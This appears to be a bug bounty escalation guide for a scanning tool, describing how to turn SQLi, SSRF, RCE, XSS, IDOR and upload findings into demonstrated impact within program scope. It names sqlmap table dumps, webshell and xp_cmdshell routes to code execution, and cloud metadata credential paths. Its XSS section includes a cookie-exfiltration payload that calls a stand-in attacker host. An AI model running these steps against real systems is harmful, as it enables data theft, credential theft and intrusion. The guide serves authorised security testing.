# Escalation guide — turning a confirmed finding into a paid report

Triagers pay for *demonstrated impact*. A confirmed primitive is a "please
verify"; a primitive with a captured consequence is a paid report. This is the
escalation path for every class SamaritanX reports, ordered by payout.

General rules:

* Only escalate within program scope and rules. Re-read the policy before the
  destructive step.
* Capture every step — screenshots, request/response pairs, timestamps. The
  report should read like a walkthrough, not an assertion.
* Prefer the minimal, most specific impact. "Full account takeover of any
  user" beats "SQL injection in parameter q".
* SamaritanX already ships per-finding `sqlmap`/Burp handoff files
  (`reports/handoff/`), HackerOne-style drafts, and CVSS vectors — start there.

## SQLi → database read → RCE

1. Confirm the DBMS and version (`sqlmap --banner` or the recorded error).
2. Dump the highest-value table first: users (emails + password hashes) or
   the sessions table. `sqlmap --tables --dump -D appdb -T users`.
3. If hashes come out, crack one (hashcat rules) — *do not* attempt to log in
   as another user beyond a proof of the hash format.
4. Escalate to RCE only when scope allows: MySQL `INTO OUTFILE` webshell,
   MSSQL `xp_cmdshell`, Postgres `COPY … PROGRAM`.

## SSRF → cloud metadata → credential theft

1. Probe the metadata chain: `/latest/meta-data/iam/security-credentials/`
   (AWS), `computeMetadata` (GCP), `metadata/instance` (Azure).
2. Capture the returned role credentials (redact in the report; show prefix +
   expiry only).
3. Demonstrate account access: `aws sts get-caller-identity` with the creds.
4. If no metadata service, enumerate internal HTTP (docker socket,
   localhost admin panels) with the recorded response as proof.

## RCE → host fingerprint → lateral

1. Replace the marker with `id;uname -a;hostname` (the tool already does this
   under `--aggressive` impact proving).
2. Read one sensitive file to prove reach (`/etc/shadow` readable? env vars?).
3. Never leave a persistent shell on shared infra; document and clean up.

## XSS → session theft → account takeover

1. Replace `alert()` with `fetch('https://attacker.tld/?'+document.cookie)`.
2. If cookies are HttpOnly, steal a CSRF token + replay a state change, or
   read private data from the DOM and exfiltrate it.
3. Stored XSS: show the payload persists for *other* users (log out, log in as
   the second account, trigger).

## IDOR/BOLA → bulk enumeration → PII dump

1. Prove cross-tenant access with the second identity (the tool's deep-IDOR
   finding already captures this).
2. Enumerate a numeric range *boundedly* (3-5 objects, not thousands) and
   show each returns a different user's PII.
3. If a write verb works (PUT/DELETE), demonstrate one destructive capability
   on a resource you created.

## Upload → stored XSS → webshell

1. Fetch the uploaded file anonymously to prove public reach.
2. If SVG renders as image/svg+xml on the main origin, show the onload firing
   in the victim context.
3. If a server handler executes (.phtml etc.), the marker output IS the proof
   — escalate to `id` only where the program allows.

## Auth bypass / path normalization / version bypass

1. Prove the bypass on *authenticated content*: fetch the same protected
   resource with and without the bypass and diff the two.
2. If it's a header-based rewrite, show it in the raw request (Burp-ready
   request files ship with the finding).

## Secret exposure

1. The validator already marks live credentials `[CONFIRMED LIVE]`.
2. Demonstrate the *least-privilege* read the credential allows (list one
   resource, not everything).
3. Report the source location (file/commit) so remediation is actionable.

## Chain findings

Chain narratives are already computed (`chain` category). To promote one to
verified, re-run the escalation step the chain describes and capture the
resulting response — the report's chain section then carries real proof.
